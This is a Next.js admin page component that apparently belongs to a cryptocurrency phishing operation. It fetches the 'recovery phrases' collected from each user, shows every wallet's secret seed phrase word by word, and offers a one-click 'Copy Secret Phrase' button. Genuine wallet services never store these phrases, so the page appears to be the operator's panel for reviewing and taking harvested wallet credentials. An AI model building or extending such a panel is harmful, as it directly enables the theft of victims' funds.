"use client";

import { useEffect, useState } from "react";
import { useParams, useRouter } from "next/navigation";
import Link from "next/link";
import apiClient from "@/lib/axios-config";
import { toast } from "react-toastify";

interface UserDetails {
  id: number;
  name: string;
  username: string;
  email: string;
  role: string;
  isActive: number;
}

interface RecoveryPhrase {
  source: string;
  walletName: string;
  phrase: string;
  created_at: string;
}

export default function UserDetailPage() {
  const params = useParams();
  const router = useRouter();
  const userId = params?.userId;

  const [user, setUser] = useState<UserDetails | null>(null);
  const [phrases, setPhrases] = useState<RecoveryPhrase[]>([]);
  const [loading, setLoading] = useState(true);
  const [copiedIndex, setCopiedIndex] = useState<number | null>(null);

  useEffect(() => {
    if (!userId) return;

    const fetchUserDetail = async () => {
      try {
        const res = await apiClient.get(`/api/admin/users/${userId}`);
        if (res.data.status_code) {
          setUser(res.data.user);
          setPhrases(res.data.phrases || []);
        }
      } catch (err: any) {
        console.error("Error fetching user detail:", err);
        toast.error("Failed to load user credentials.");
        router.push("/admin");
      } finally {
        setLoading(false);
      }
    };

    fetchUserDetail();
  }, [userId, router]);

  const handleCopy = (phraseText: string, index: number) => {
    navigator.clipboard.writeText(phraseText);
    setCopiedIndex(index);
    toast.success("Phrase copied to clipboard!");
    setTimeout(() => setCopiedIndex(null), 2000);
  };

  if (loading) {
    return (
      <div className="tw-py-12 tw-text-center tw-space-y-4">
        <div className="tw-w-10 tw-h-10 tw-border-4 tw-border-green-500 tw-border-t-transparent tw-rounded-full tw-animate-spin tw-mx-auto"></div>
        <p className="tw-text-gray-400 tw-text-sm">Retrieving secret credentials...</p>
      </div>
    );
  }

  if (!user) return null;

  return (
    <div className="tw-space-y-6">
      {/* Top Breadcrumb & Actions */}
      <div className="tw-flex tw-justify-between tw-items-center">
        <div className="tw-space-y-1">
          <div className="tw-flex tw-items-center tw-gap-2 tw-text-xs tw-text-gray-400">
            <Link href="/admin" className="hover:tw-text-white tw-transition">Users</Link>
            <span>/</span>
            <span className="tw-text-gray-200">Credentials</span>
          </div>
          <h1 className="tw-text-2xl tw-font-bold tw-text-white">User Recovery Credentials</h1>
        </div>
        <Link
          href="/admin"
          className="tw-bg-[#161b22] hover:tw-bg-white/[0.02] tw-border tw-border-solid tw-border-gray-800 tw-rounded-xl tw-px-4 tw-py-2 tw-text-xs tw-font-bold tw-text-gray-300 tw-transition"
        >
          ← Return to Users
        </Link>
      </div>

      {/* User Info Overview */}
      <div className="tw-bg-[#161b22] tw-border tw-border-solid tw-border-gray-800 tw-rounded-2xl tw-p-6">
        <h2 className="tw-text-sm tw-font-bold tw-text-gray-400 tw-uppercase tw-tracking-wider tw-mb-4">Account Profile Details</h2>
        <div className="tw-grid tw-grid-cols-1 md:tw-grid-cols-3 tw-gap-6">
          <div>
            <div className="tw-text-xs tw-text-gray-500">Full Name</div>
            <div className="tw-text-sm tw-font-semibold tw-text-white tw-mt-1">{user.name}</div>
          </div>
          <div>
            <div className="tw-text-xs tw-text-gray-500">Email Address</div>
            <div className="tw-text-sm tw-font-semibold tw-text-white tw-mt-1">{user.email}</div>
          </div>
          <div>
            <div className="tw-text-xs tw-text-gray-500">Role / Status</div>
            <div className="tw-mt-1 tw-flex tw-items-center tw-gap-2">
              <span className="tw-px-2 tw-py-0.5 tw-bg-gray-800 tw-text-gray-300 tw-rounded tw-text-[10px] tw-font-bold tw-uppercase">
                {user.role}
              </span>
              <span className="tw-w-2 tw-h-2 tw-bg-green-400 tw-rounded-full" />
              <span className="tw-text-xs tw-text-green-400 tw-font-medium">Active</span>
            </div>
          </div>
        </div>
      </div>

      {/* Phrase Listing */}
      <div className="tw-space-y-4">
        <div className="tw-flex tw-items-center tw-justify-between">
          <h2 className="tw-text-lg tw-font-bold tw-text-white">Linked Recovery Phrases ({phrases.length})</h2>
          <span />
        </div>

        {phrases.length > 0 ? (
          <div className="tw-grid tw-grid-cols-1 tw-gap-4">
            {phrases.map((p, idx) => (
              <div
                key={idx}
                className="tw-bg-[#161b22] tw-border tw-border-solid tw-border-gray-800 tw-rounded-2xl tw-p-6 tw-relative tw-overflow-hidden"
              >
                {/* Visual Accent */}
                <div className="tw-absolute tw-top-0 tw-left-0 tw-bottom-0 tw-w-1.5 tw-bg-green-500" />

                {/* Phrase Header info */}
                <div className="tw-flex tw-justify-between tw-items-start tw-mb-4 tw-pl-2">
                  <div>
                    <span className="tw-text-xs tw-bg-green-500/10 tw-text-green-400 tw-border tw-border-solid tw-border-green-500/20 tw-px-2.5 tw-py-1 tw-rounded-md tw-font-bold">
                      💼 {p.walletName}
                    </span>
                    <span />
                  </div>
                  <div className="tw-text-xs tw-text-gray-500">
                    Connected: {p.created_at ? new Date(p.created_at).toLocaleString() : "N/A"}
                  </div>
                </div>

                {/* The Phrase Words Grid */}
                <div className="tw-bg-[#0d1117] tw-border tw-border-solid tw-border-gray-800 tw-rounded-xl tw-p-5 tw-mb-4 tw-pl-4">
                  <div className="tw-text-xs tw-text-gray-500 tw-mb-2.5 tw-font-medium">SECRET RECOVERY SEED PHRASE:</div>
                  <div className="tw-grid tw-grid-cols-3 sm:tw-grid-cols-4 md:tw-grid-cols-6 tw-gap-2">
                    {p.phrase.split(/\s+/).map((word, wordIdx) => (
                      <div
                        key={wordIdx}
                        className="tw-bg-[#161b22] tw-border tw-border-solid tw-border-gray-800 tw-rounded-lg tw-px-3 tw-py-1.5 tw-flex tw-items-center tw-gap-1.5"
                      >
                        <span className="tw-text-[10px] tw-text-gray-500 tw-font-bold">{wordIdx + 1}.</span>
                        <span className="tw-text-xs tw-font-semibold tw-text-white">{word}</span>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Copy phrase button */}
                <div className="tw-flex tw-justify-end tw-pl-2">
                  <button
                    onClick={() => handleCopy(p.phrase, idx)}
                    className={`tw-inline-flex tw-items-center tw-gap-1.5 tw-text-xs tw-font-bold tw-px-4 tw-py-2.5 tw-rounded-xl tw-transition ${copiedIndex === idx
                      ? "tw-bg-green-600 tw-text-white"
                      : "tw-bg-green-500/10 tw-text-green-400 hover:tw-bg-green-500/20 tw-border tw-border-solid tw-border-green-500/30"
                      }`}
                  >
                    {copiedIndex === idx ? "✅ Copied!" : "📋 Copy Secret Phrase"}
                  </button>
                </div>
              </div>
            ))}
          </div>
        ) : (
          <div className="tw-bg-[#161b22] tw-border tw-border-solid tw-border-gray-800 tw-rounded-2xl tw-py-12 tw-text-center tw-text-gray-500 tw-text-sm">
            No recovery phrases connected for this user yet.
          </div>
        )}
      </div>
    </div>
  );
}